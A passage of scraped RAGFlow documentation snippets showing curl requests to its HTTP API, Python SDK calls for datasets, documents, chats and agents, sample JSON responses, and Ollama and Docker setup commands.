doc.add_chunk(content=\"xxxxxxx\")\nchunk.update({\"content\":\"sdfx...\"})\n```\n\n----------------------------------------\n\nTITLE: Chat Completion Non-Stream Response Format\nDESCRIPTION: Example JSON response format for a non-streaming chat completion request. This provides the complete response in a single JSON object including the full message content and usage statistics.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"choices\":[\n        {\n            \"finish_reason\":\"stop\",\n            \"index\":0,\n            \"logprobs\":null,\n            \"message\":{\n                \"content\":\"This is a test. If you have any specific questions or need information, feel free to ask, and I will do my best to provide an answer based on the knowledge I have. If your question is unrelated to the provided knowledge base, I will let you know.\",\n                \"role\":\"assistant\"\n            }\n        }\n    ],\n    \"created\":1740543499,\n    \"id\":\"chatcmpl-3a9c3572f29311efa69751e139332ced\",\n    \"model\":\"model\",\n    \"object\":\"chat.completion\",\n    \"usage\":{\n        \"completion_tokens\":246,\n        \"completion_tokens_details\":{\n            \"accepted_prediction_tokens\":246,\n            \"reasoning_tokens\":18,\n            \"rejected_prediction_tokens\":0\n        },\n        \"prompt_tokens\":18,\n        \"total_tokens\":264\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Ollama Model on Windows\nDESCRIPTION: Command to run a pulled Ollama model on Windows systems\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_12\n\nLANGUAGE: cmd\nCODE:\n```\nollama run qwen2:latest\n```\n\n----------------------------------------\n\nTITLE: Deleting Chunks from a Document in Python using RAGFlow SDK\nDESCRIPTION: This snippet illustrates how to delete chunks from a document using the RAGFlow SDK. It retrieves a dataset and document, adds a chunk, then deletes specific chunks by their IDs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_16\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.list_datasets(id=\"123\")\ndataset = dataset[0]\ndoc = dataset.list_documents(id=\"wdfxb5t547d\")\ndoc = doc[0]\nchunk = doc.add_chunk(content=\"xxxxxxx\")\ndoc.delete_chunks([\"id_1\",\"id_2\"])\n```\n\n----------------------------------------\n\nTITLE: Chat Completion Error Response Format\nDESCRIPTION: Example JSON error response when a chat completion request fails. This shows the error code and message format used by the API.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"code\": 102,\n  \"message\": \"The last content of this conversation is not from user.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Launching Ollama Service on Linux\nDESCRIPTION: Environment setup and launch command for Ollama service on Linux systems, including Intel OneAPI configuration\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nexport OLLAMA_NUM_GPU=999\nexport no_proxy=localhost,127.0.0.1\nexport ZES_ENABLE_SYSMAN=1\nsource /opt/intel/oneapi/setvars.sh\nexport SYCL_CACHE_PERSISTENT=1\n\n./ollama serve\n```\n\n----------------------------------------\n\nTITLE: Deleting Datasets with RAGFlow\nDESCRIPTION: Example of deleting datasets using the RAGFlow SDK. It shows how to call the delete_datasets method with specific dataset IDs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nrag_object.delete_datasets(ids=[\"id_1\",\"id_2\"])\n```\n\n----------------------------------------\n\nTITLE: Sending Retrieval Request in Bash\nDESCRIPTION: This snippet demonstrates how to send a POST request to the RAGFlow retrieval endpoint using curl. It includes the necessary headers and a JSON payload with question and dataset parameters.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/retrieval \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"question\": \"What is advantage of ragflow?\",\n          \"dataset_ids\": [\"b2a62730759d11ef987d0242ac120004\"],\n          \"document_ids\": [\"77df9ef4759a11ef8bdd0242ac120004\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: Updating Document Configuration in RAGFlow (Bash)\nDESCRIPTION: Sends a PUT request to update configurations for a specified document within a dataset. Includes parameters for name, chunk method, and parser configuration.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request PUT \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/info/{document_id} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --header 'Content-Type: application/json' \\\n     --data '\n     {\n          \"name\": \"manual.txt\", \n          \"chunk_method\": \"manual\", \n          \"parser_config\": {\"chunk_token_count\": 128}\n     }'\n```\n\n----------------------------------------\n\nTITLE: Downloading Documents in RAGFlow SDK (Python)\nDESCRIPTION: Downloads a document from RAGFlow and saves it to a local file. Returns the document content as bytes.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.list_datasets(id=\"id\")\ndataset = dataset[0]\ndoc = dataset.list_documents(id=\"wdfxb5t547d\")\ndoc = doc[0]\nopen(\"~/ragflow.txt\", \"wb+\").write(doc.download())\nprint(doc)\n```\n\n----------------------------------------\n\nTITLE: Curl Request for Listing Chat Assistants\nDESCRIPTION: Example curl command for retrieving a list of chat assistants with optional filtering and pagination parameters.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_34\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request GET \\\n     --url http://{address}/api/v1/chats?page={page}&page_size={page_size}&orderby={orderby}&desc={desc}&name={chat_name}&id={chat_id} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>'\n```\n\n----------------------------------------\n\nTITLE: Uploading Documents to RAGFlow Dataset (Bash)\nDESCRIPTION: Sends a POST request to upload one or more documents to a specified dataset. Requires dataset ID and file(s) in the request body.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/documents \\\n     --header 'Content-Type: multipart/form-data' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --form 'file=@./test1.txt' \\\n     --form 'file=@./test2.pdf'\n```\n\n----------------------------------------\n\nTITLE: Listing Documents in RAGFlow SDK (Python)\nDESCRIPTION: Retrieves a list of documents from a dataset in RAGFlow. Supports filtering by ID or keywords, pagination, and sorting options. Returns a list of Document objects with various attributes.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.create_dataset(name=\"kb_1\")\n\nfilename1 = \"~/ragflow.txt\"\nblob = open(filename1 , \"rb\").read()\ndataset.upload_documents([{\"name\":filename1,\"blob\":blob}])\nfor doc in dataset.list_documents(keywords=\"rag\", page=0, page_size=12):\n    print(doc)\n```\n\n----------------------------------------\n\nTITLE: Creating Agent Session with Parameters (Bash)\nDESCRIPTION: This curl command creates a new agent session when the Begin component takes parameters. It sends a POST request to the completions endpoint with a JSON body containing language and file parameters.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_50\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/agents/{agent_id}/completions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data-binary '\n     {\n          \"lang\":\"English\",\n          \"file\":\"How is the weather tomorrow?\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Updating and Restarting RAGFlow Docker Containers\nDESCRIPTION: Commands to pull the latest Docker image and restart the RAGFlow containers with the updated version.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/upgrade_ragflow.mdx#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose -f docker/docker-compose.yml pull\ndocker compose -f docker/docker-compose.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Deleting Documents in RAGFlow SDK (Python)\nDESCRIPTION: Deletes specified documents from a dataset in RAGFlow. If no IDs are provided, all documents in the dataset will be deleted.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.list_datasets(name=\"kb_1\")\ndataset = dataset[0]\ndataset.delete_documents(ids=[\"id_1\",\"id_2\"])\n```\n\n----------------------------------------\n\nTITLE: Successful Streaming Response (JSON)\nDESCRIPTION: This JSON response shows a successful streaming completion with parameters specified in the Begin component. It includes multiple data chunks with progressive answers.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_54\n\nLANGUAGE: json\nCODE:\n```\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"How\",\n        \"reference\": {},\n        \"id\": \"0379ac4c-b26b-4a44-8b77-99cebf313fdf\",\n        \"session_id\": \"4399c7d0b86311efac5b0242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"How is\",\n        \"reference\": {},\n        \"id\": \"0379ac4c-b26b-4a44-8b77-99cebf313fdf\",\n        \"session_id\": \"4399c7d0b86311efac5b0242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"How is the\",\n        \"reference\": {},\n        \"id\": \"0379ac4c-b26b-4a44-8b77-99cebf313fdf\",\n        \"session_id\": \"4399c7d0b86311efac5b0242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"How is the weather\",\n        \"reference\": {},\n        \"id\": \"0379ac4c-b26b-4a44-8b77-99cebf313fdf\",\n        \"session_id\": \"4399c7d0b86311efac5b0242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"How is the weather tomorrow\",\n        \"reference\": {},\n        \"id\": \"0379ac4c-b26b-4a44-8b77-99cebf313fdf\",\n        \"session_id\": \"4399c7d0b86311efac5b0242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"How is the weather tomorrow?\",\n        \"reference\": {},\n        \"id\": \"0379ac4c-b26b-4a44-8b77-99cebf313fdf\",\n        \"session_id\": \"4399c7d0b86311efac5b0242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"How is the weather tomorrow?\",\n        \"reference\": {},\n        \"id\": \"0379ac4c-b26b-4a44-8b77-99cebf313fdf\",\n        \"session_id\": \"4399c7d0b86311efac5b0242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Conversing with an Agent in RAGFlow Python SDK\nDESCRIPTION: Method for asking questions to an agent. Similar to chat assistant conversations, it supports streaming mode and returns Message objects with AI responses and references.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_34\n\nLANGUAGE: python\nCODE:\n```\nSession.ask(question: str=\"\", stream: bool = False) -> Optional[Message, iter[Message]]\n```\n\n----------------------------------------\n\nTITLE: Updating Document Attributes in RAGFlow SDK (Python)\nDESCRIPTION: Updates attributes of a document in RAGFlow. Includes options for updating display name, meta fields, chunk method, and parser configuration. The chunk method determines how the document is parsed and affects the parser configuration options.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.list_datasets(id='id')\ndataset = dataset[0]\ndoc = dataset.list_documents(id=\"wdfxb5t547d\")\ndoc = doc[0]\ndoc.update([{\"parser_config\": {\"chunk_token_count\": 256}}, {\"chunk_method\": \"manual\"}])\n```\n\n----------------------------------------\n\nTITLE: Failed Response (JSON)\nDESCRIPTION: This JSON response shows a failed completion due to a missing required parameter. It includes an error code and message.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_55\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"`question` is required.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Session with an Agent in RAGFlow Python SDK\nDESCRIPTION: Method for creating an interactive session with an agent. Accepts parameters for the 'begin' component. Returns a Session object with ID, messages, and agent ID.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_32\n\nLANGUAGE: python\nCODE:\n```\nAgent.create_session(**kwargs) -> Session\n```\n\n----------------------------------------\n\nTITLE: Listing Chat Assistants with RAGFlow SDK in Python\nDESCRIPTION: This code snippet shows how to list all chat assistants using the RAGFlow SDK. It demonstrates the usage of the list_chats method and how to iterate through the returned list of Chat objects.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_23\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nfor assistant in rag_object.list_chats():\n    print(assistant)\n```\n\n----------------------------------------\n\nTITLE: Successful Response for Update Operation\nDESCRIPTION: Example JSON response when a chat assistant is successfully updated, showing a simple success code.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_30\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Dataset API Request\nDESCRIPTION: Example curl command to create a new dataset with a specified name and configuration parameters\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/datasets \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '{\n      \"name\": \"test_1\"\n      }'\n```\n\n----------------------------------------\n\nTITLE: Deleting Chat Assistant Sessions Example in RAGFlow\nDESCRIPTION: Example showing how to retrieve a chat assistant by name and delete specific sessions by their IDs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_29\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nassistant = rag_object.list_chats(name=\"Miss R\")\nassistant = assistant[0]\nassistant.delete_sessions(ids=[\"id_1\",\"id_2\"])\n```\n\n----------------------------------------\n\nTITLE: Curl Request for Deleting Chat Assistants\nDESCRIPTION: Example curl command for deleting multiple chat assistants by specifying their IDs in a JSON array.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_32\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request DELETE \\\n     --url http://{address}/api/v1/chats \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"ids\": [\"test_1\", \"test_2\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: Dataset Creation Success Response\nDESCRIPTION: Example JSON response showing successful dataset creation with configuration details\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": {\n        \"avatar\": null,\n        \"chunk_count\": 0,\n        \"chunk_method\": \"naive\",\n        \"create_date\": \"Thu, 24 Oct 2024 09:14:07 GMT\",\n        \"create_time\": 1729761247434,\n        \"created_by\": \"69736c5e723611efb51b0242ac120007\",\n        \"description\": null,\n        \"document_count\": 0,\n        \"embedding_model\": \"BAAI/bge-large-zh-v1.5\",\n        \"id\": \"527fa74891e811ef9c650242ac120006\",\n        \"language\": \"English\",\n        \"name\": \"test_1\",\n        \"parser_config\": {\n            \"chunk_token_num\": 128,\n            \"delimiter\": \"\\\\n\",\n            \"html4excel\": false,\n            \"layout_recognize\": true,\n            \"raptor\": {\n                \"user_raptor\": false\n            }\n        },\n        \"permission\": \"me\",\n        \"similarity_threshold\": 0.2,\n        \"status\": \"1\",\n        \"tenant_id\": \"69736c5e723611efb51b0242ac120007\",\n        \"token_num\": 0,\n        \"update_date\": \"Thu, 24 Oct 2024 09:14:07 GMT\",\n        \"update_time\": 1729761247434,\n        \"vector_similarity_weight\": 0.3\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Successful Retrieval Response in JSON\nDESCRIPTION: This snippet shows the structure of a successful response from the RAGFlow retrieval endpoint. It includes the retrieved chunks, document aggregations, and total count.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_24\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": {\n        \"chunks\": [\n            {\n                \"content\": \"ragflow content\",\n                \"content_ltks\": \"ragflow content\",\n                \"document_id\": \"5c5999ec7be811ef9cab0242ac120005\",\n                \"document_keyword\": \"1.txt\",\n                \"highlight\": \"<em>ragflow</em> content\",\n                \"id\": \"d78435d142bd5cf6704da62c778795c5\",\n                \"image_id\": \"\",\n                \"important_keywords\": [\n                    \"\"\n                ],\n                \"kb_id\": \"c7ee74067a2c11efb21c0242ac120006\",\n                \"positions\": [\n                    \"\"\n                ],\n                \"similarity\": 0.9669436601210759,\n                \"term_similarity\": 1.0,\n                \"vector_similarity\": 0.8898122004035864\n            }\n        ],\n        \"doc_aggs\": [\n            {\n                \"count\": 1,\n                \"doc_id\": \"5c5999ec7be811ef9cab0242ac120005\",\n                \"doc_name\": \"1.txt\"\n            }\n        ],\n        \"total\": 1\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Error Response for Chat Operations\nDESCRIPTION: Example error response when there's a failure in chat assistant operations, such as trying to create a chat with a duplicate name.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_28\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"Duplicated chat name in creating dataset.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Datasets API Request\nDESCRIPTION: Example curl command to retrieve a list of datasets with optional filtering parameters\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request GET \\\n     --url http://{address}/api/v1/datasets?page={page}&page_size={page_size}&orderby={orderby}&desc={desc}&name={dataset_name}&id={dataset_id} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>'\n```\n\n----------------------------------------\n\nTITLE: Response Format for Chat Completion with Session ID in JSON\nDESCRIPTION: Example JSON response format for a successful chat completion request with a session ID. The response demonstrates the streaming data structure with progressive answer updates and reference information.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_42\n\nLANGUAGE: json\nCODE:\n```\ndata:{\n    \"code\": 0,\n    \"data\": {\n        \"answer\": \"I am an intelligent assistant designed to help answer questions by summarizing content from a\",\n        \"reference\": {},\n        \"audio_binary\": null,\n        \"id\": \"a84c5dd4-97b4-4624-8c3b-974012c8000d\",\n        \"session_id\": \"82b0ab2a9c1911ef9d870242ac120006\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"data\": {\n        \"answer\": \"I am an intelligent assistant designed to help answer questions by summarizing content from a knowledge base. My responses are based on the information available in the knowledge base and\",\n        \"reference\": {},\n        \"audio_binary\": null,\n        \"id\": \"a84c5dd4-97b4-4624-8c3b-974012c8000d\",\n        \"session_id\": \"82b0ab2a9c1911ef9d870242ac120006\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"data\": {\n        \"answer\": \"I am an intelligent assistant designed to help answer questions by summarizing content from a knowledge base. My responses are based on the information available in the knowledge base and any relevant chat history.\",\n        \"reference\": {},\n        \"audio_binary\": null,\n        \"id\": \"a84c5dd4-97b4-4624-8c3b-974012c8000d\",\n        \"session_id\": \"82b0ab2a9c1911ef9d870242ac120006\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"data\": {\n        \"answer\": \"I am an intelligent assistant designed to help answer questions by summarizing content from a knowledge base ##0$$. My responses are based on the information available in the knowledge base and any relevant chat history.\",\n        \"reference\": {\n            \"total\": 1,\n            \"chunks\": [\n                {\n                    \"id\": \"faf26c791128f2d5e821f822671063bd\",\n                    \"content\": \"xxxxxxxx\",\n                    \"document_id\": \"dd58f58e888511ef89c90242ac120006\",\n                    \"document_name\": \"1.txt\",\n                    \"dataset_id\": \"8e83e57a884611ef9d760242ac120006\",\n                    \"image_id\": \"\",\n                    \"similarity\": 0.7,\n                    \"vector_similarity\": 0.0,\n                    \"term_similarity\": 1.0,\n                    \"positions\": [\n                        \"\"\n                    ]\n                }\n            ],\n            \"doc_aggs\": [\n                {\n                    \"doc_name\": \"1.txt\",\n                    \"doc_id\": \"dd58f58e888511ef89c90242ac120006\",\n                    \"count\": 1\n                }\n            ]\n        },\n        \"prompt\": \"xxxxxxxxxxx\",\n        \"id\": \"a84c5dd4-97b4-4624-8c3b-974012c8000d\",\n        \"session_id\": \"82b0ab2a9c1911ef9d870242ac120006\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"data\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Agent Session with Required Parameters using cURL\nDESCRIPTION: Example cURL command to create a session with an agent that requires specific parameters. This request includes language preference and a file parameter in the request body.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_45\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/agents/{agent_id}/sessions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '{\n            \"lang\":\"Japanese\",\n            \"file\":\"Who are you\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Building Full Docker Image for RAGFlow with Embedding Models\nDESCRIPTION: Commands to clone the RAGFlow repository and build a full Docker image (about 9GB) including embedding models. This image only relies on external LLM services.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build -f Dockerfile -t infiniflow/ragflow:nightly .\n```\n\n----------------------------------------\n\nTITLE: Response JSON Structure for Retrieving Agent Data\nDESCRIPTION: Shows the successful response format when retrieving agent data, including agent_id, DSL configuration with components, graph structure, and message history.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_57\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": [{\n        \"agent_id\": \"e9e2b9c2b2f911ef801d0242ac120006\",\n        \"dsl\": {\n            \"answer\": [],\n            \"components\": {\n                \"Answer:OrangeTermsBurn\": {\n                    \"downstream\": [],\n                    \"obj\": {\n                        \"component_name\": \"Answer\",\n                        \"params\": {}\n                    },\n                    \"upstream\": []\n                },\n                \"Generate:SocialYearsRemain\": {\n                    \"downstream\": [],\n                    \"obj\": {\n                        \"component_name\": \"Generate\",\n                        \"params\": {\n                            \"cite\": true,\n                            \"frequency_penalty\": 0.7,\n                            \"llm_id\": \"gpt-4o___OpenAI-API@OpenAI-API-Compatible\",\n                            \"message_history_window_size\": 12,\n                            \"parameters\": [],\n                            \"presence_penalty\": 0.4,\n                            \"prompt\": \"Please summarize the following paragraph. Pay attention to the numbers and do not make things up. The paragraph is as follows:\\n{input}\\nThis is what you need to summarize.\",\n                            \"temperature\": 0.1,\n                            \"top_p\": 0.3\n                        }\n                    },\n                    \"upstream\": []\n                },\n                \"begin\": {\n                    \"downstream\": [],\n                    \"obj\": {\n                        \"component_name\": \"Begin\",\n                        \"params\": {}\n                    },\n                    \"upstream\": []\n                }\n            },\n            \"graph\": {\n                \"edges\": [],\n                \"nodes\": [\n                    {\n                        \"data\": {\n                            \"label\": \"Begin\",\n                            \"name\": \"begin\"\n                        },\n                        \"height\": 44,\n                        \"id\": \"begin\",\n                        \"position\": {\n                            \"x\": 50,\n                            \"y\": 200\n                        },\n                        \"sourcePosition\": \"left\",\n                        \"targetPosition\": \"right\",\n                        \"type\": \"beginNode\",\n                        \"width\": 200\n                    },\n                    {\n                        \"data\": {\n                            \"form\": {\n                                \"cite\": true,\n                                \"frequencyPenaltyEnabled\": true,\n                                \"frequency_penalty\": 0.7,\n                                \"llm_id\": \"gpt-4o___OpenAI-API@OpenAI-API-Compatible\",\n                                \"maxTokensEnabled\": true,\n                                \"message_history_window_size\": 12,\n                                \"parameters\": [],\n                                \"presencePenaltyEnabled\": true,\n                                \"presence_penalty\": 0.4,\n                                \"prompt\": \"Please summarize the following paragraph. Pay attention to the numbers and do not make things up. The paragraph is as follows:\\n{input}\\nThis is what you need to summarize.\",\n                                \"temperature\": 0.1,\n                                \"temperatureEnabled\": true,\n                                \"topPEnabled\": true,\n                                \"top_p\": 0.3\n                            },\n                            \"label\": \"Generate\",\n                            \"name\": \"Generate Answer_0\"\n                        },\n                        \"dragging\": false,\n                        \"height\": 105,\n                        \"id\": \"Generate:SocialYearsRemain\",\n                        \"position\": {\n                            \"x\": 561.3457829707513,\n                            \"y\": 178.7211182312641\n                        },\n                        \"positionAbsolute\": {\n                            \"x\": 561.3457829707513,\n                            \"y\": 178.7211182312641\n                        },\n                        \"selected\": true,\n                        \"sourcePosition\": \"right\",\n                        \"targetPosition\": \"left\",\n                        \"type\": \"generateNode\",\n                        \"width\": 200\n                    },\n                    {\n                        \"data\": {\n                            \"form\": {},\n                            \"label\": \"Answer\",\n                            \"name\": \"Dialogue_0\"\n                        },\n                        \"height\": 44,\n                        \"id\": \"Answer:OrangeTermsBurn\",\n                        \"position\": {\n                            \"x\": 317.2368194777658,\n                            \"y\": 218.30635555445093\n                        },\n                        \"sourcePosition\": \"right\",\n                        \"targetPosition\": \"left\",\n                        \"type\": \"logicNode\",\n                        \"width\": 200\n                    }\n                ]\n            },\n            \"history\": [],\n            \"messages\": [],\n            \"path\": [],\n            \"reference\": []\n        },\n        \"id\": \"792dde22b2fa11ef97550242ac120006\",\n        \"message\": [\n            {\n                \"content\": \"Hi! I'm your smart assistant. What can I do for you?\",\n                \"role\": \"assistant\"\n            }\n        ],\n        \"source\": \"agent\",\n        \"user_id\": \"\"\n    }]\n}\n```\n\n----------------------------------------\n\nTITLE: Error Response for Unauthorized Agent Access\nDESCRIPTION: Shows the error response format when a user attempts to access an agent they don't own, including error code and explanatory message.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_58\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"You don't own the agent ccd2f856b12311ef94ca0242ac1200052.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Successful Document Upload Response (JSON)\nDESCRIPTION: Example of a successful response when uploading documents, including details about the uploaded file(s).\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": [\n        {\n            \"chunk_method\": \"naive\",\n            \"created_by\": \"69736c5e723611efb51b0242ac120007\",\n            \"dataset_id\": \"527fa74891e811ef9c650242ac120006\",\n            \"id\": \"b330ec2e91ec11efbc510242ac120004\",\n            \"location\": \"1.txt\",\n            \"name\": \"1.txt\",\n            \"parser_config\": {\n                \"chunk_token_num\": 128,\n                \"delimiter\": \"\\\\n\",\n                \"html4excel\": false,\n                \"layout_recognize\": true,\n                \"raptor\": {\n                    \"user_raptor\": false\n                }\n            },\n            \"run\": \"UNSTART\",\n            \"size\": 17966,\n            \"thumbnail\": \"\",\n            \"type\": \"doc\"\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Successful Response Structure in RAGFlow API\nDESCRIPTION: Shows the successful response format containing workflow details including DSL components, 